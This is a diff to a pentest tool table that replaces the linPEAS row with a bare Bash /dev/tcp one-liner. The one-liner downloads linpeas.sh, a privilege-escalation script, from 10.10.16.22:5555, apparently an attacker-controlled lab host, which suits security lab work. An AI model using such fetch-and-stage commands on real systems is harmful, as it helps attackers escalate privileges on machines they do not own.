@@ -28,4 +28,12 @@
 | [john (John the Ripper)](https://www.openwall.com/john/) | Password cracker | `sudo apt install john` |
 | [hashcat](https://hashcat.net/hashcat/) | GPU password cracker | `sudo apt install hashcat` |
 | [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoner | `git clone` |
-| [linPEAS](https://github.com/carlospolop/PEASS-ng) | Linux privesc audit | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` <br>**Alternative (raw TCP / HTTP over netcat):** ``printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' | nc 10.10.16.22 5555 > linpeas.sh`` <br>**Alternative (Bash /dev/tcp):** ``( exec 3<>/dev/tcp/10.10.16.22/5555; printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh`` |
+
+
+
+**Alternative (Bash /dev/tcp):** 
+```
+
+( exec 3<>/dev/tcp/10.10.16.22/5555; printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
+
+```
